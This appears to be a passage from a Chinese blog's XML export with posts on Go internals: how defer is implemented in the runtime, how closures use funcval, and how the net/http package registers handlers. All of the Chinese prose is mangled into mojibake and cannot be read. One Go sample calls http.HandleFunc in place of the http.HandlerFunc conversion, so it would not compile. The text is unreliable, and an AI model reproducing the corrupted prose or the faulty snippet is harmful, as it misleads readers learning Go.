&quot;&quot;.&amp;i+8(SP), AX</span><br><span class="line">        0x0005 00005 (Defer.go:5)       INCQ    (AX)</span><br><span class="line">        0x0008 00008 (Defer.go:6)       RET</span><br></pre></td></tr></table></figure>

<p><code>FUNCDATA</code> å’Œ <code>PCDATA</code> éƒ½æ˜¯ç¼–è¯‘å™¨ä¸ºè¿è¡Œæ—¶åƒåœ¾å›æ”¶é¢å¤–æ·»åŠ çš„å†…å®¹ã€‚ä»æ±‡ç¼–ä»£ç ç¬¬ 28 è¡Œå¯ä»¥çœ‹åˆ°ï¼Œå¯ç”¨å¼€æ”¾ç¼–ç ä»¥åæ‰§è¡Œå»¶è¿Ÿå‡½æ•°å°±è·Ÿæ™®é€šçš„å‡½æ•°è°ƒç”¨ä¸€æ ·ï¼Œéƒ½æ˜¯é€šè¿‡ <code>CALL</code> æŒ‡ä»¤å®Œæˆã€‚</p>
<h3 id="æ‰§è¡Œå»¶è¿Ÿè°ƒç”¨"><a href="#æ‰§è¡Œå»¶è¿Ÿè°ƒç”¨" class="headerlink" title="æ‰§è¡Œå»¶è¿Ÿè°ƒç”¨"></a>æ‰§è¡Œå»¶è¿Ÿè°ƒç”¨</h3><p>ç¼–è¯‘å™¨ä¸ä»…å°† defer å…³é”®å­—éƒ½è½¬æ¢æˆ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> ã€<a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a> æˆ–è€…å†…è”å‡½æ•°ï¼Œè¿˜ä¼šåœ¨æ‰€æœ‰è°ƒç”¨ defer çš„å‡½æ•°æœ«å°¾æ’å…¥ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> çš„å‡½æ•°è°ƒç”¨ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferreturn</span><span class="params">(arg0 <span class="keyword">uintptr</span>)</span></span> &#123;</span><br><span class="line">    gp := getg()</span><br><span class="line">    d := gp._defer</span><br><span class="line">    <span class="keyword">if</span> d == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="comment">//  å½“å‰ Goroutine æŒæœ‰çš„æ‰€æœ‰å»¶è¿Ÿå‡½æ•°éƒ½å¾—åˆ°æ‰§è¡Œäº†ï¼Œå‡½æ•°è¿”å›</span></span><br><span class="line">    sp := getcallersp()</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> d.siz &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="comment">// Do nothing.</span></span><br><span class="line">    <span class="keyword">case</span> sys.PtrSize:</span><br><span class="line">        *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;arg0)) = *(*<span class="keyword">uintptr</span>)(deferArgs(d))</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        memmove(unsafe.Pointer(&amp;arg0), deferArgs(d), <span class="keyword">uintptr</span>(d.siz))</span><br><span class="line">    &#125;</span><br><span class="line">    fn := d.fn</span><br><span class="line">    d.fn = <span class="literal">nil</span></span><br><span class="line">    gp._defer = d.link</span><br><span class="line">    freedefer(d)</span><br><span class="line">    _  = fn.fn</span><br><span class="line">    jmpdefer(fn, <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;arg0)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://draveness.me/golang/tree/runtime.jmpdefer">runtime.jmpdefer</a> æ˜¯ä¸€ä¸ªç”¨æ±‡ç¼–è¯­è¨€å®ç°çš„è¿è¡Œæ—¶å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦å·¥ä½œæ˜¯è·³è½¬åˆ° defer æ‰€åœ¨çš„ä»£ç æ®µå¹¶åœ¨æ‰§è¡Œç»“æŸä¹‹åè·³è½¬å› <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEXT runtimeÂ·jmpdefer(SB), NOSPLIT, $0-8</span><br><span class="line">    MOVL    fv+0(FP), DX    // fn</span><br><span class="line">    MOVL    argp+4(FP), BX  // caller sp</span><br><span class="line">    LEAL    -4(BX), SP      // caller sp after CALL</span><br><span class="line">    #ifdef GOBUILDMODE_shared</span><br><span class="line">    SUBL    $16, (SP)       // return to CALL again</span><br><span class="line">    #else</span><br><span class="line">    SUBL    $5, (SP)        // return to CALL again</span><br><span class="line">    #endif</span><br><span class="line">    MOVL    0(DX), BX</span><br><span class="line">    JMP BX                  // but first run the deferred function</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> å‡½æ•°ä¼šå¤šæ¬¡åˆ¤æ–­å½“å‰ Goroutine çš„ _defer é“¾è¡¨ä¸­æ˜¯å¦æœ‰æœªæ‰§è¡Œçš„ç»“æ„ä½“ï¼Œ<strong>è¯¥å‡½æ•°åªæœ‰åœ¨æ‰€æœ‰å»¶è¿Ÿå‡½æ•°éƒ½æ‰§è¡Œåæ‰ä¼šè¿”å›</strong>ã€‚</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><code>defer</code> çš„å®ç°ä¸»è¦ä¾é ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶çš„åä½œï¼Œç»å†äº†å¥½å‡ ä¸ªç‰ˆæœ¬çš„æ›´è¿­ï¼Œå…¶å¯ç”¨æ€§ä¹Ÿè¶Šæ¥è¶Šå¼ºã€‚æˆªæ­¢ç›®å‰ï¼ˆ2020å¹´12æœˆ16æ—¥ï¼‰ç»å†äº†ä¸‰ç§æœºåˆ¶ï¼š</p>
<ol>
<li><p>å †ä¸Šåˆ†é…(1.1 ~ ç°åœ¨)ï¼š</p>
<ul>
<li>ç¼–è¯‘æœŸå°† defer å…³é”®å­—è¢«è½¬æ¢ä¸º <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> å¹¶åœ¨è°ƒç”¨ defer å…³é”®å­—çš„å‡½æ•°è¿”å›ä¹‹å‰æ’å…¥ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a></li>
<li>è¿è¡Œæ—¶è°ƒç”¨ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L22">runtime.deferproc</a> ä¼šå°†ä¸€ä¸ªæ–°çš„ <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„ä½“è¿½åŠ åˆ°å½“å‰ Goroutine çš„é“¾è¡¨å¤´ï¼›</li>
<li>è¿è¡Œæ—¶è°ƒç”¨ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> ä¼šä» Goroutine çš„é“¾è¡¨ä¸­å–å‡º <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„å¹¶ä¾æ¬¡æ‰§è¡Œï¼›</li>
</ul>
</li>
<li><p>æ ˆä¸Šåˆ†é…(1.13 ~ ç°åœ¨):</p>
<ul>
<li>å½“è¯¥å…³é”®å­—åœ¨å‡½æ•°ä½“ä¸­æœ€å¤šæ‰§è¡Œä¸€æ¬¡æ—¶ï¼Œç¼–è¯‘æœŸé—´çš„ <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L4324">cmd/compile/internal/gc.state.call</a> ä¼šå°† <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„ä½“åˆ†é…åˆ°æ ˆä¸Šå¹¶è°ƒç”¨ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a></li>
</ul>
</li>
<li><p>å¼€æ”¾ç¼–ç (1.14 ~ ç°åœ¨):</p>
<ul>
<li>ç¼–è¯‘æœŸé—´åˆ¤æ–­ defer å…³é”®å­—ã€return è¯­å¥çš„ä¸ªæ•°ç¡®å®šæ˜¯å¦å¼€å¯å¼€æ”¾ç¼–ç ä¼˜åŒ–</li>
<li>é€šè¿‡ deferBits å’Œ <a href="https://draveness.me/golang/tree/cmd/compile/internal/gc.openDeferInfo">cmd/compile/internal/gc.openDeferInfo</a> å­˜å‚¨ defer å…³é”®å­—çš„ç›¸å…³ä¿¡æ¯ï¼›</li>
<li>å¦‚æœ defer å…³é”®å­—çš„æ‰§è¡Œå¯ä»¥åœ¨ç¼–è¯‘æœŸé—´ç¡®å®šï¼Œä¼šåœ¨å‡½æ•°è¿”å›å‰ç›´æ¥è·³è½¬åˆ°ç›¸åº”çš„ä»£ç ï¼Œå¦åˆ™ä¼šç”±è¿è¡Œæ—¶çš„  <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> å¤„ç†</li>
</ul>
</li>
</ol>
<p>äºæ˜¯å‰é¢æè¿‡çš„ä¸¤ä¸ªç°è±¡å°±å¯ä»¥è§£é‡Šäº†ï¼š</p>
<ul>
<li>åè°ƒç”¨çš„ defer å‡½æ•°ä¼šå…ˆæ‰§è¡Œï¼šåè°ƒç”¨çš„ defer å‡½æ•°ä¼šè¢«è¿½åŠ åˆ° Goroutine çš„ <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> é“¾è¡¨çš„æœ€å‰é¢ï¼Œè€Œè¿è¡Œæ—¶æ˜¯ä»é“¾è¡¨çš„å‰åˆ°åä¾æ¬¡æ‰§è¡Œ</li>
<li>å‡½æ•°çš„å‚æ•°ä¼šè¢«é¢„å…ˆè®¡ç®—ï¼šè°ƒç”¨ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L22">runtime.deferproc</a> å‡½æ•°åˆ›å»ºæ–°çš„å»¶è¿Ÿè°ƒç”¨æ—¶å°±ä¼šç«‹åˆ»æ‹·è´å‡½æ•°çš„å‚æ•°ï¼Œå‡½æ•°çš„å‚æ•°ä¸ä¼šç­‰åˆ°çœŸæ­£æ‰§è¡Œæ—¶è®¡ç®—ï¼›</li>
</ul>
<p>æ‰€æœ‰ä½¿ç”¨äº† defer å…³é”®å­—çš„å‡½æ•°æœ€åéƒ½ä¼šæ’å…¥  <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> ä¿è¯å»¶è¿Ÿå‡½æ•°å¾—åˆ°æ‰§è¡Œã€‚</p>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://draveness.me/golang/docs/part2-foundation/ch05-keyword/golang-defer/#53-defer">Goè¯­è¨€è®¾è®¡ä¸å®ç°</a></p>
<p><a href="https://blog.golang.org/defer-panic-and-recover">Defer, Panic and Recover</a></p>
<p><a href="https://leokongwq.github.io/2016/10/15/golang-defer.html">golangä¹‹deferç®€ä»‹</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/56557423">Golangä¹‹è½»æ¾åŒ–è§£deferçš„æ¸©æŸ”é™·é˜±</a></p>
<p><a href="https://www.bilibili.com/video/BV1E5411x7NC">eggo: defer1.12</a></p>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Goåº•å±‚å¤§å†’é™©ä¹‹é—­åŒ…</title>
    <url>/2020/06/21/go%E5%BA%95%E5%B1%82%E5%A4%A7%E5%86%92%E9%99%A9%E4%B9%8B%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<p>Go è¯­è¨€ä¸­å‡½æ•°æ˜¯æ‰€è°“â€œå¤´ç­‰å¯¹è±¡â€ï¼Œå³å¯ä»¥é€šè¿‡å‚æ•°ä¼ é€’ï¼Œå¯ä»¥åšå‡½æ•°è¿”å›å€¼ï¼Œä¹Ÿå¯ä»¥åšä¸ºå³å€¼èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ã€‚Go è¯­è¨€æŠŠè¿™æ ·çš„å‚æ•°ã€è¿”å›å€¼ã€å˜é‡ç§°ä¸º <code>function value</code>ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ª <code>runtime.funcval</code> ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ä¿å­˜äº†å‡½æ•°çš„å…¥å£åœ°å€ã€‚</p>
<p><img src="https://i.loli.net/2020/06/21/FJnO7hbSEKM86jR.png" alt="FunctionValue"></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š<code>func A</code> çš„æŒ‡ä»¤ä½äºä»£ç æ®µçš„ addr1ã€‚ç”±äº <code>func A</code> å¯¹åº”çš„ <code>funcval</code> æ²¡æœ‰æ•è·åˆ—è¡¨ï¼Œç¼–è¯‘æœŸé—´ç¼–è¯‘å™¨ä¼šåœ¨åªè¯»æ•°æ®æ®µåˆ†é…ä¸€ä¸ª <code>funcval</code> ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“æœ¬èº«çš„åœ°å€æ˜¯ addr2 ï¼Œå®ƒä¿å­˜äº† <code>func A</code> çš„åœ°å€ addr1ï¼Œå¤šæ¬¡ <code>func A</code> è°ƒç”¨å…±äº«ä¸€ä¸ª <code>funcval</code>ã€‚æ‰§è¡Œé˜¶æ®µï¼Œaddr2 ä¼šè¢«èµ‹äºˆ f1 ä¸ f2ã€‚æ‰§è¡Œ f1 å°±æ˜¯é€šè¿‡ f1 æ‰¾å‡ºå¯¹åº”çš„ <code>funcval</code>ï¼Œè¿›è€Œæ‹¿åˆ° <code>func A</code> å…¥å£åœ°å€ã€‚</p>
<p><img src="https://i.loli.net/2020/06/21/4Dmf2zuxHWtgwCJ.png" alt="FunctionValueä¸¾ä¾‹"></p>
<h2 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h2><p>æ—¢ç„¶æœ‰äº†å‡½æ•°å…¥å£åœ°å€å°±èƒ½é—´æ¥è°ƒç”¨å‡½æ•°ï¼Œä¸ºä»€ä¹ˆè¦åœ¨ä¸­é—´æ’å…¥ä¸€å±‚ <code>funcval</code> å‘¢ï¼Ÿè¿™å°±æ˜¯å‡ºäº<strong>é—­åŒ…</strong>çš„è€ƒè™‘äº†ï¼š</p>
<p><img src="https://i.loli.net/2020/06/21/NsIxdGY69SLgzub.png" alt="é—­åŒ…"></p>
<p>åœ¨ä¸€äº›è¯­è¨€ä¸­(å¦‚C++)ï¼Œè¿”å›å±€éƒ¨å˜é‡çš„åœ°å€æˆ–å¼•ç”¨è¢«è®¤ä¸ºæ˜¯ä¸æ˜æ™ºçš„ï¼Œå› ä¸ºå±€éƒ¨å˜é‡éƒ½åˆ†é…åœ¨æ ˆé‡Œï¼Œå½“å‡½æ•°æ‰§è¡Œç»“æŸå…¶å ç”¨çš„æ ˆç©ºé—´ä¹Ÿéšä¹‹é‡Šæ”¾ï¼Œæ­¤æ—¶æˆ‘ä»¬è¿”å›çš„å±€éƒ¨å˜é‡ä¹Ÿè¢«é‡Šæ”¾æ‰äº†ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨è¿™äº›è¢«é‡Šæ”¾æ‰çš„å˜é‡å°±ä¼šäº§ç”Ÿæ‰€è°“â€œå˜é‡é€ƒé€¸â€é—®é¢˜ã€‚</p>
<p>æ‰€å¹¸ JavaScriptã€Go ç­‰è¯­è¨€éƒ½æ˜¯æ”¯æŒé—­åŒ…çš„ã€‚é‚£ä¹ˆ Go åº•å±‚æ˜¯å¦‚ä½•å®ç°é—­åŒ…çš„å‘¢ï¼Ÿ</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šè¿è¡Œæ—¶åœ¨å †åˆ†é…ä¸¤ä¸ª <code>funcval</code> ç»“æ„ä½“åœ°å€åˆ†åˆ«ä¸º addr2ã€addr3ã€‚æ¯ä¸ª <code>funcval</code> åŒæ—¶åˆä¿å­˜äº†å„è‡ªçš„æ•è·åˆ—è¡¨ã€‚é€šè¿‡æ•è·åˆ—è¡¨å°±èƒ½ä½¿ç”¨ä¿å­˜ä¸‹æ¥çš„å¯¹è±¡äº†ã€‚</p>
<p><img src="https://i.loli.net/2020/06/21/jU3g9E4tn5dSWh8.png" alt="Goé—­åŒ…"></p>
<p>é€šå¸¸æ¥è®²ï¼Œå±€éƒ¨å˜é‡éƒ½æ˜¯åˆ†é…åœ¨æ ˆçš„ï¼Œä¸Šå›¾ä¹Ÿæ˜¯è¿™æ ·ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ•è·å˜é‡çš„å€¼ä¼šå‘ç”Ÿæ”¹å˜ï¼ŒGo ç¼–è¯‘å™¨ä¼šåœ¨å †ä¸Šåˆ†é…å±€éƒ¨å˜é‡ï¼Œæ ˆä¸Šåªä¿å­˜ä¸€ä¸ªåœ°å€ã€‚è¿™å°±æ˜¯æ‰€è°“çš„â€œå±€éƒ¨å˜é‡å †åˆ†é…â€ã€‚<code>funcval</code> çš„æ•è·åˆ—è¡¨ä¿å­˜å±€éƒ¨å˜é‡çš„åœ°å€ï¼Œè¿™æ ·é—­åŒ…å‡½æ•°å’Œå¤–å±‚å‡½æ•°å°±æŒ‡å‘åŒä¸€ä¸ªå˜é‡äº†ã€‚</p>
<p><img src="https://i.loli.net/2020/06/21/NuOHmoygfK3scbL.png" alt="Goå¼•ç”¨æ•è·å˜é‡"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol>
<li>Go å†…éƒ¨ä¼šæŠŠæ‰€æœ‰ <code>function value</code> è½¬åŒ–ä¸º <code>funcval</code> ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ä¿å­˜äº†å‡½æ•°çš„å®é™…åœ°å€ã€‚</li>
<li>å¾—ç›Šäº <code>funcval</code> åšä¸ºä¸­é—´è½½ä½“ï¼ŒGo å®ç°äº†é—­åŒ…ã€‚<code>funcval</code> ä¼šæœ‰ä¸€ä¸ªæ•è·åˆ—è¡¨ï¼Œé‡Œé¢æˆ–æ˜¯ä¿å­˜äº†æ•è·å˜é‡çš„æ‹·è´ï¼Œæˆ–æ˜¯ä¿å­˜äº†æ•è·å˜é‡çš„åœ°å€ã€‚</li>
</ol>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>B ç«™è¿™ä¸ª up è®²å¾—è›®å¥½ï¼Œé€šä¿—æ˜“æ‡‚ï¼Œç›´æ¥æ˜äº†: <a href="https://www.bilibili.com/video/BV1ma4y1e7R5">eggo-tech</a></p>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆæ¢httpåŒ…â€”â€”goç½‘ç»œæœåŠ¡çš„ç¬¬ä¸€æ­¥</title>
    <url>/2020/06/03/http%E5%8C%85%E2%80%94%E2%80%94go%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/</url>
    <content><![CDATA[<p>ä»…éœ€å‡ è¡Œ go ä»£ç å°±å¯ä»¥æ„å»ºä¸€ä¸ªé«˜æ•ˆçš„ HTTP æœåŠ¡å™¨:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">       w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;hello world!&quot;</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—® <code>127.0.0.1:8080</code> å°±å¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸ªæœåŠ¡å™¨å·²ç»æˆåŠŸå¯åŠ¨äº†ï¼ˆè€Œä¸”å’Œ Python ç­‰è¯­è¨€è‡ªå¸¦çš„æœåŠ¡å™¨ç›¸æ¯”æ€§èƒ½å¾ˆå¼ºå“¦ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2020/06/03/k3QcvMgNR1mr59A.png" alt="httpæœåŠ¡å™¨"></p>
<p>å¯¹ä¸€æ¬¡ HTTP é€šä¿¡ï¼Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨å®¢æˆ·ç«¯ï¼ˆclientï¼‰å’ŒæœåŠ¡ç«¯ï¼ˆServerï¼‰å³å¯ã€‚è€Œä¸€ä¸ª HTTP æœåŠ¡å™¨æœ€é‡è¦çš„åŠŸèƒ½è«è¿‡äº <code>è·¯ç”±</code>ï¼Œå³å®ç°ä¸€ä¸ªå¤šè·¯é€‰æ‹©å™¨ï¼ˆmultiplexerï¼‰ã€‚æœ¬æ–‡å°±æ¥æ¢ç´¢è¿™èƒŒåçš„ç§˜å¯†ã€‚</p>
<p>å…ˆè®¤è¯†ä¸€ä¸‹ Server ç±»ï¼š</p>
<p><img src="https://i.loli.net/2020/06/03/asTBZgulqdQXwco.png" alt="http.Server"></p>
<h2 id="ä»-Handler-è¯´èµ·"><a href="#ä»-Handler-è¯´èµ·" class="headerlink" title="ä» Handler è¯´èµ·"></a>ä» Handler è¯´èµ·</h2><p>Handler æ˜¯ä¸€ä¸ªæŠ½è±¡æ¥å£ï¼Œå…¶å”¯ä¸€çš„æ–¹æ³•æ˜¯ <code>ServeHTTP(ResponseWriter, *Request)</code>ã€‚<br>å®ç°äº† Handler æ¥å£çš„å¯¹è±¡å¯ä»¥æ³¨å†Œåˆ° Serverï¼Œä¸ºç‰¹å®šçš„è·¯å¾„åŠå…¶å­æ ‘æä¾›æœåŠ¡ã€‚</p>
<p>ä¸‹é¢æ˜¯ http åŒ…ä¸­å®ç°äº† Handler çš„ç±»ï¼š</p>
<p><img src="https://i.loli.net/2020/06/03/v63t1eTHROSb9dM.png" alt="Handleræ¥å£"></p>
<p>å› ä¸ºæœ¬åŒ…å¤šå¤„ä½¿ç”¨åˆ°åä¸º handler çš„ Handler å®ä¾‹ï¼Œè€Œè¿™äº›å®ä¾‹å¯èƒ½æ‹¥æœ‰ä¸åŒçš„å®ç°ï¼Œæ‰€ä»¥æœ‰å¿…è¦åšä¸€ä¸ªåˆ†ç±»ï¼š</p>
<ul>
<li>handler å¤„ç†å™¨å‡½æ•°ï¼šç­¾åä¸º <code>func(ResponseWriter, *Request)</code> çš„å‡½æ•°</li>
<li>handler å¤„ç†å™¨ï¼šç»è¿‡ <code>HandleFunc</code> åŒ…è£…ï¼Œå®ç°äº† <code>Handler</code> æ¥å£çš„å‡½æ•°</li>
<li>handler å¯¹è±¡ï¼šä»»ä½•å®ç°äº† <code>Handler</code> æ¥å£çš„ç»“æ„ä½“</li>
</ul>
<p><img src="https://i.loli.net/2020/06/04/Y9glIrx8Ud5yfou.png" alt="Handlerå¯¹è±¡ä¹‹é—´çš„å…³ç³»"></p>
<h2 id="æ³¨å†Œå¤„ç†å™¨"><a href="#æ³¨å†Œå¤„ç†å™¨" class="headerlink" title="æ³¨å†Œå¤„ç†å™¨"></a>æ³¨å†Œå¤„ç†å™¨</h2><p>Server æ ¹æ®è¯·æ±‚é€‰æ‹©åˆé€‚çš„å¤„ç†å™¨æ„å»ºå“åº”ï¼Œé‚£ä¹ˆå½“ç„¶äº‹å…ˆè¦åœ¨ Server ä¸­æŠŠ è¯·æ±‚-å¤„ç†å™¨ ä¹‹é—´çš„å…³ç³»æ³¨å†Œå¥½ï¼Œ<code>ServerMux</code> å°±æ˜¯è´Ÿè´£å…³ç³»è¯·æ±‚æ¨¡å¼ä¸²å’Œå¤„ç†å™¨ä¹‹é—´çš„å…³ç³»çš„ã€‚</p>
<p>æ³¨å†Œä¸€ä¸ªå¤„ç†å™¨çš„å¸¸ç”¨æ–¹æ³•å°±æ˜¯è°ƒç”¨ <code>http.HandleFunc(pattern string, handler func(ResponseWriter, *Request))</code>ï¼Œå…¶èƒŒåçš„é€»è¾‘å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2020/06/03/rvLk8VzcFeJyXNw.png" alt="æ„å»ºå¤„ç†å‡½æ•°"></p>
<p><code>http.HandleFunc(pattern string, handler func(ResponseWriter, *Request))</code> ä¼šä½¿ç”¨ DefaultServeMux çš„ <code>HandleFunc</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æŠŠ handler å¤„ç†å™¨å‡½æ•°åŒ…è£…ä¸º handler å¤„ç†å™¨ï¼Œç„¶åé€šè¿‡ DefaultServeMux çš„ <code>Handle</code> æ–¹æ³•æŠŠè¿™ä¸ªå¤„ç†å™¨æ³¨å†Œåˆ°ç›¸åº”æ¨¡å¼ä¸²å»ã€‚è¿™æ ·å°±å®Œæˆäº†ä¸€æ¬¡ <code>æ¨¡å¼ä¸²-å¤„ç†å™¨</code> çš„æ³¨å†Œã€‚</p>
<p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ª ServeMux å®ä¾‹å¹¶è°ƒç”¨å…¶ <code>HandleFunc</code> æ–¹æ³•æŠŠå¤„ç†å™¨æ³¨å†Œåˆ°è‡ªå®šä¹‰çš„ ServeMux ä¸Šå»ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> hiHandler <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *hiHandler)</span> <span class="title">ServeHTTP</span><span class="params">(w http.ResponseWriter,  r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprint(w, <span class="string">&quot;hi, world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := http.NewServeMux()</span><br><span class="line">    mux.HandleFunc(<span class="string">&quot;/hello&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">    &#125;) <span class="comment">// ServeMux.HandleFunc éœ€è¦ä¸€ä¸ª handler å¤„ç†å™¨å‡½æ•°</span></span><br><span class="line">    mux.Handle(<span class="string">&quot;/bye&quot;</span>, http.HandleFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;bye world!&quot;</span>)</span><br><span class="line">    &#125;)) <span class="comment">// æŠŠä¸€ä¸ª handler å¤„ç†å™¨å‡½æ•°åŒ…è£…æˆä¸€ä¸ª handler å¤„ç†å™¨</span></span><br><span class="line">    mux.Handle(<span class="string">&quot;/hi&quot;</span>, &amp;hiHandler&#123;&#125;) <span class="comment">// ç›´æ¥ç»™ä¸€ä¸ª handler å¯¹è±¡</span></span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, mux) <span class="comment">// æŒ‡å®š DefaultServer ä½¿ç”¨è‡ªå®šä¹‰çš„ ServeMux</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å¤„ç†è¯·æ±‚"><a href="#å¤„ç†è¯·æ±‚" class="headerlink" title="å¤„ç†è¯·æ±‚"></a>å¤„ç†è¯·æ±‚</h2><p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ª Server å¯¹å„ç§è¯·æ±‚è¿›è¡Œæ€»å¤„ç†ï¼Œè°ƒç”¨ <code>http.ListenAndServe(string, Handler)</code> ä¼šåˆå§‹åŒ–ä¸€ä¸ª Server å®ä¾‹ï¼Œå…¶èƒŒåé€»è¾‘å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2020/06/04/TiXUv2jkazD1HYN.png" alt="å¤„ç†è¯·æ±‚"></p>
